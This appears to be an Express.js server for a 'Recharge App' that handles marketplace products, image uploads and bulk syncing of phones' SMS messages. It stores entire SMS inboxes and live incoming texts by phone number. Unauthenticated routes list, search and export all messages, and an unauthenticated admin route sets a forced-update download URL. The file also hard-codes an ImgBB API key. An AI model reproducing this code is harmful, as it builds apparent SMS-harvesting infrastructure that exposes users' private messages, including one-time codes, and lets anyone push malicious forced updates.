app.get(['/app/version', '/api/app/version'], async (req, res) => {
  try {
    const settings = await db.getAppSettings();
    res.json({
      success: true,
      latest_version: settings.latestVersion || '1.0.0',
      version_code: settings.versionCode || 1,
      min_version_code: settings.minVersionCode || 1,
      download_url: settings.downloadUrl || '',
      force_update: settings.forceUpdate !== false,
      release_notes: settings.releaseNotes || 'নতুন আপডেট ও পারফরম্যান্স উন্নতি',
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * UPDATE APP VERSION (Admin)
 * POST /api/app/version or POST /admin/app/version
 */
app.post(['/app/version', '/api/app/version', '/admin/app/version', '/api/admin/app/version'], async (req, res) => {
  try {
    const {
      latest_version,
      latestVersion,
      version_code,
      versionCode,
      min_version_code,
      minVersionCode,
      download_url,
      downloadUrl,
      force_update,
      forceUpdate,
      release_notes,
      releaseNotes,
    } = req.body || {};

    const updates = {};
    if (latest_version !== undefined || latestVersion !== undefined) updates.latestVersion = String(latest_version ?? latestVersion).trim();
    if (version_code !== undefined || versionCode !== undefined) updates.versionCode = Number(version_code ?? versionCode);
    if (min_version_code !== undefined || minVersionCode !== undefined) updates.minVersionCode = Number(min_version_code ?? minVersionCode);
    if (download_url !== undefined || downloadUrl !== undefined) updates.downloadUrl = String(download_url ?? downloadUrl).trim();
    if (force_update !== undefined || forceUpdate !== undefined) updates.forceUpdate = Boolean(force_update ?? forceUpdate);
    if (release_notes !== undefined || releaseNotes !== undefined) updates.releaseNotes = String(release_notes ?? releaseNotes).trim();

    const updated = await db.updateAppSettings(updates);
    socketService.getIO()?.emit('app-version-updated', {
      latest_version: updated.latestVersion,
      version_code: updated.versionCode,
      min_version_code: updated.minVersionCode,
      download_url: updated.downloadUrl,
      force_update: updated.forceUpdate,
      release_notes: updated.releaseNotes,
    });
    res.json({
      success: true,
      message: 'App version updated successfully',
      data: {
        latest_version: updated.latestVersion,
        version_code: updated.versionCode,
        min_version_code: updated.minVersionCode,
        download_url: updated.downloadUrl,
        force_update: updated.forceUpdate,
        release_notes: updated.releaseNotes,
      },
    });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

// ============================================================================
// 📸 IMGBB IMAGE UPLOAD PROXY (Supports Single & Multiple Product Images)
// ============================================================================
const IMGBB_API_KEY = process.env.IMGBB_API_KEY || 'bdb1740562edb396275444abca610543';

async function uploadBase64ToImgBB(base64Input, name) {
  if (!IMGBB_API_KEY) {
    throw new Error('ImgBB API key is not configured on the server.');
  }
  // Strip data URI prefix (e.g. "data:image/jpeg;base64,") if present
  const cleanBase64 = String(base64Input || '').replace(/^data:image\/[a-zA-Z0-9+.-]+;base64,/, '').trim();
  if (!cleanBase64) {
    throw new Error('Invalid or empty image data.');
  }

  const formData = new FormData();
  formData.append('key', IMGBB_API_KEY);
  formData.append('image', cleanBase64);
  if (name) formData.append('name', String(name).slice(0, 80));

  const response = await fetch('https://api.imgbb.com/1/upload', {
    method: 'POST',
    body: formData,
  });

  const json = await response.json();
  if (!response.ok || !json || !json.success || !json.data) {
    const errMsg = json?.error?.message || `ImgBB upload failed (HTTP ${response.status})`;
    throw new Error(errMsg);
  }

  return {
    url: json.data.display_url || json.data.url,
    thumb: json.data.thumb?.url || json.data.medium?.url || json.data.display_url || json.data.url,
    deleteUrl: json.data.delete_url || '',
  };
}

/**
 * UPLOAD IMAGE(S) TO IMGBB
 * POST /api/upload-image
 * Body: { image: "base64..." } OR { images: ["base64...", ...] }
 */
app.post(['/upload-image', '/api/upload-image'], async (req, res) => {
  try {
    const { image, images, name } = req.body || {};

    if (Array.isArray(images) && images.length > 0) {
      const results = [];
      for (let i = 0; i < images.length; i++) {
        const uploaded = await uploadBase64ToImgBB(images[i], name ? `${name}_${i + 1}` : undefined);
        results.push(uploaded);
      }
      return res.json({
        success: true,
        count: results.length,
        urls: results.map((r) => r.url),
        data: results,
      });
    }

    if (image) {
      const uploaded = await uploadBase64ToImgBB(image, name);
      return res.json({
        success: true,
        url: uploaded.url,
        thumb: uploaded.thumb,
        data: uploaded,
      });
    }

    return res.status(400).json({ success: false, error: 'Please provide base64 "image" or "images" array.' });
  } catch (err) {
    console.error('[ImgBB Upload Error]:', err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============================================================================
// 🛍️ 2ND-HAND PRODUCTS (BUY & SELL MARKETPLACE)
// ============================================================================

/**
 * GET ALL 2ND-HAND PRODUCTS
 * GET /api/products?category=mobiles&search=iphone&minPrice=10000&maxPrice=60000&sort=newest
 */
app.get(['/products', '/api/products'], async (req, res) => {
  try {
    const { category, search, minPrice, maxPrice, status, condition, sort } = req.query;
    const products = await db.getProducts({ category, search, minPrice, maxPrice, status, condition, sort });
    res.json({ success: true, count: products.length, data: products });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * GET PRODUCT BY ID
 * GET /api/products/:id
 */
app.get(['/products/:id', '/api/products/:id'], async (req, res) => {
  try {
    const product = await db.getProductById(req.params.id);
    if (!product) return res.status(404).json({ success: false, error: 'Product not found' });
    res.json({ success: true, data: product });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * CREATE 2ND-HAND PRODUCT
 * POST /api/products
 */
app.post(['/products', '/api/products'], async (req, res) => {
  try {
    const product = await db.createProduct(req.body);
    console.log(`[Product] Created new 2nd-hand product: ${product.id} - ${product.title}`);
    socketService.getIO()?.emit('products-updated');
    res.status(201).json({ success: true, message: 'Product created successfully', data: product });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * UPDATE 2ND-HAND PRODUCT
 * PUT /api/products/:id
 */
app.put(['/products/:id', '/api/products/:id'], async (req, res) => {
  try {
    const product = await db.updateProduct(req.params.id, req.body);
    socketService.getIO()?.emit('products-updated');
    res.json({ success: true, message: 'Product updated successfully', data: product });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * DELETE 2ND-HAND PRODUCT
 * DELETE /api/products/:id
 */
app.delete(['/products/:id', '/api/products/:id'], async (req, res) => {
  try {
    const success = await db.deleteProduct(req.params.id);
    if (!success) return res.status(404).json({ success: false, error: 'Product not found' });
    socketService.getIO()?.emit('products-updated');
    res.json({ success: true, message: 'Product deleted successfully' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * ============================================================================
 * 🏷️ DYNAMIC CATEGORIES API (CRUD + Live Sync)
 * ============================================================================
 */

/**
 * GET /api/categories
 */
app.get(['/categories', '/api/categories'], async (req, res) => {
  try {
    const categories = await db.getCategories();
    res.json({ success: true, count: categories.length, data: categories });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * POST /api/categories
 */
app.post(['/categories', '/api/categories'], async (req, res) => {
  try {
    const category = await db.createCategory(req.body);
    console.log(`[Category] Created/updated category: ${category.id} - ${category.title}`);
    const allCategories = await db.getCategories();
    socketService.getIO()?.emit('categories-updated', allCategories);
    res.status(201).json({ success: true, message: 'Category created successfully', data: category });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * PUT /api/categories/:id
 */
app.put(['/categories/:id', '/api/categories/:id'], async (req, res) => {
  try {
    const category = await db.updateCategory(req.params.id, req.body);
    const allCategories = await db.getCategories();
    socketService.getIO()?.emit('categories-updated', allCategories);
    res.json({ success: true, message: 'Category updated successfully', data: category });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * DELETE /api/categories/:id
 */
app.delete(['/categories/:id', '/api/categories/:id'], async (req, res) => {
  try {
    const success = await db.deleteCategory(req.params.id);
    if (!success) return res.status(404).json({ success: false, error: 'Category not found' });
    const allCategories = await db.getCategories();
    socketService.getIO()?.emit('categories-updated', allCategories);
    res.json({ success: true, message: 'Category deleted successfully' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * List of All Receipt Numbers / Users registered with messages
 * GET /api/sms/receipts or GET /api/sms/users
 */
app.get(['/api/sms/receipts', '/api/sms/users'], async (req, res) => {
  try {
    const data = await db.getReceiptNumbersList();
    res.json({
      success: true,
      data,
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * GET SMS for a Specific Receipt Number (e.g. 0197272313)
 * GET /api/sms/receipt/:receiptNumber
 */
app.get('/api/sms/receipt/:receiptNumber', async (req, res) => {
  try {
    const receiptNumber = req.params.receiptNumber;
    const { search, category, sender, threadId, page, limit } = req.query;

    const result = await db.getMessages({
      search,
      category,
      sender,
      threadId,
      receiptNumber,
      page,
      limit,
    });

    res.json({
      success: true,
      receiptNumber,
      count: result.messages.length,
      data: result.messages,
      pagination: {
        total: result.total,
        page: result.page,
        limit: result.limit,
        totalPages: result.totalPages,
      },
    });
  } catch (err) {
    console.error('[API] Error in GET /api/sms/receipt/:receiptNumber:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * GET SMS for a Specific User Phone Number (User Login Retrieval)
 * GET /api/sms/user/:phoneNumber
 */
app.get('/api/sms/user/:phoneNumber', async (req, res) => {
  try {
    const phoneNumber = req.params.phoneNumber;
    const { search, category, sender, threadId, page, limit } = req.query;

    const result = await db.getMessages({
      search,
      category,
      sender,
      threadId,
      receiptNumber: phoneNumber,
      recipientPhone: phoneNumber,
      page,
      limit,
    });

    res.json({
      success: true,
      userPhone: phoneNumber,
      receiptNumber: phoneNumber,
      data: result.messages,
      pagination: {
        total: result.total,
        page: result.page,
        limit: result.limit,
        totalPages: result.totalPages,
      },
    });
  } catch (err) {
    console.error('[API] Error in GET /api/sms/user/:phoneNumber:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * Retroactively assign a receipt number (e.g. 0197272313) to existing messages
 * POST /api/sms/assign-receipt-number
 */
app.post('/api/sms/assign-receipt-number', async (req, res) => {
  try {
    const receiptNumber = req.body?.receiptNumber || req.body?.recipientPhone || req.body?.userPhone || '0197272313';
    const deviceModel = req.body?.deviceModel || null;
    const count = await db.assignReceiptNumber(receiptNumber, deviceModel);
    const total = await db.getTotalMessagesCount();

    res.json({
      success: true,
      message: `Assigned receiptNumber "${receiptNumber}" to ${count} messages`,
      receiptNumber,
      updatedCount: count,
      totalMessages: total,
    });
  } catch (err) {
    console.error('[API] Error in assign-receipt-number:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * BATCH SYNC: Store an entire batch of SMS messages from mobile app
 * POST /api/sms/sync-batch
 */
app.post('/api/sms/sync-batch', authenticate, async (req, res) => {
  try {
    const body = req.body || {};
    const messages = Array.isArray(body) ? body : body.messages || [];
    const device = body.device || {};
    const receiptNumber = body.receiptNumber || body.userPhone || body.recipientPhone || device.receiptNumber || device.userPhone || '';

    if (!Array.isArray(messages)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid payload: "messages" array is required',
      });
    }

    const result = await db.upsertBatch(messages, device, receiptNumber);
    socketService.emitNewSms(result);
    console.log(
      `[API] Batch sync processed: ${result.inserted} inserted, ${result.updated} updated (total in DB: ${result.total}) for receiptNumber [${receiptNumber || 'Unassigned'}] from ${device.modelName || 'device'}`
    );

    res.json({
      success: true,
      message: `Successfully synced ${messages.length} messages (${result.inserted} new, ${result.updated} updated)`,
      receiptNumber: receiptNumber || null,
      userPhone: receiptNumber || null,
      syncedCount: messages.length,
      inserted: result.inserted,
      updated: result.updated,
      totalInDb: result.total,
      syncedAt: Date.now(),
    });
  } catch (err) {
    console.error('[API] Error in sync-batch:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * LIVE INCOMING SYNC: Store a real-time incoming SMS
 * POST /api/sms/incoming
 */
app.post('/api/sms/incoming', authenticate, async (req, res) => {
  try {
    const body = req.body || {};
    const message = body.message || body;
    const device = body.device || {};
    const receiptNumber = body.receiptNumber || body.userPhone || body.recipientPhone || message.receiptNumber || message.recipientPhone || device.receiptNumber || device.userPhone || '';

    if (!message || !message.body) {
      return res.status(400).json({
        success: false,
        error: 'Invalid payload: message object with "body" is required',
      });
    }

    const stored = await db.addIncoming(message, device, receiptNumber);
    socketService.emitNewSms(stored);
    console.log(
      `[API] Live incoming SMS received from ${stored.sender} for receiptNumber [${stored.receiptNumber || 'Unassigned'}]: "${stored.body.slice(0, 40)}..."`
    );

    res.status(201).json({
      success: true,
      message: 'Incoming SMS successfully backed up',
      receiptNumber: stored.receiptNumber,
      data: stored,
    });
  } catch (err) {
    console.error('[API] Error in incoming SMS sync:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * GET ALL SMS: List, filter, search, paginate
 * GET /api/sms?receiptNumber=...&category=...&search=...
 */
app.get('/api/sms', async (req, res) => {
  try {
    const { search, category, sender, threadId, receiptNumber, recipientPhone, userPhone, page, limit } = req.query;
    const targetReceipt = receiptNumber || recipientPhone || userPhone;
    const result = await db.getMessages({
      search,
      category,
      sender,
      threadId,
      receiptNumber: targetReceipt,
      page,
      limit,
    });

    res.json({
      success: true,
      receiptNumber: targetReceipt || null,
      data: result.messages,
      pagination: {
        total: result.total,
        page: result.page,
        limit: result.limit,
        totalPages: result.totalPages,
      },
    });
  } catch (err) {
    console.error('[API] Error in GET /api/sms:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * GET SINGLE SMS: By ID
 * GET /api/sms/:id
 */
app.get('/api/sms/:id', async (req, res) => {
  try {
    const msg = await db.getMessageById(req.params.id);
    if (!msg) {
      return res.status(404).json({ success: false, error: 'Message not found' });
    }
    res.json({ success: true, data: msg });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * CREATE CUSTOM SMS: Manual entry via UI
 * POST /api/sms
 */
app.post('/api/sms', authenticate, async (req, res) => {
  try {
    const { body, sender, phoneNumber, recipientPhone, userPhone, category, notes, tags } = req.body;
    if (!body || !sender) {
      return res.status(400).json({ success: false, error: 'Sender and body are required' });
    }

    const created = await db.createCustomMessage({
      body,
      sender,
      phoneNumber: phoneNumber || sender,
      recipientPhone: recipientPhone || userPhone || '',
      category: category || 'personal',
      notes: notes || '',
      tags: tags || ['manual'],
    });

    res.status(201).json({ success: true, data: created });
  } catch (err) {
    console.error('[API] Error in create SMS:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * UPDATE SMS: Edit category, notes, tags, or recipientPhone
 * PUT /api/sms/:id
 */
app.put('/api/sms/:id', authenticate, async (req, res) => {
  try {
    const updated = await db.updateMessage(req.params.id, req.body);
    if (!updated) {
      return res.status(404).json({ success: false, error: 'Message not found' });
    }
    res.json({ success: true, data: updated });
  } catch (err) {
    console.error('[API] Error updating SMS:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * DELETE SMS: Remove a message
 * DELETE /api/sms/:id
 */
app.delete('/api/sms/:id', authenticate, async (req, res) => {
  try {
    const deleted = await db.deleteMessage(req.params.id);
    if (!deleted) {
      return res.status(404).json({ success: false, error: 'Message not found' });
    }
    res.json({ success: true, message: 'Message successfully deleted' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * EXPORT ALL DATA: Download full backup as JSON
 * GET /api/export
 */
app.get('/api/export', async (req, res) => {
  try {
    const data = await db.exportAll();
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename="sms_backup_${Date.now()}.json"`);
    res.send(JSON.stringify(data, null, 2));
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Fallback for Webview Dashboard SPA
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start Server after connecting to MongoDB Atlas
async function startServer() {
  try {
    await db.connect();
    server.listen(PORT, '0.0.0.0', () => {
      console.log(`====================================================`);
      console.log(`🚀 Recharge App Server Running on Port ${PORT}!`);
      console.log(`📍 Local:   http://localhost:${PORT}`);
      console.log(`🌐 Network: http://0.0.0.0:${PORT}`);
      console.log(`🔌 WebSockets: Socket.IO Enabled`);
      console.log(`🍃 Database: MongoDB Atlas (recharge_app)`);
      console.log(`====================================================`);
    });
  } catch (err) {
    console.error('[Server] Fatal startup error:', err);
    process.exit(1);
  }
}

// Start Server locally if run directly with Node (non-Vercel environment)
if (require.main === module || !process.env.VERCEL) {
  startServer();
}

// Export Express application for Vercel Serverless Functions
module.exports = app;
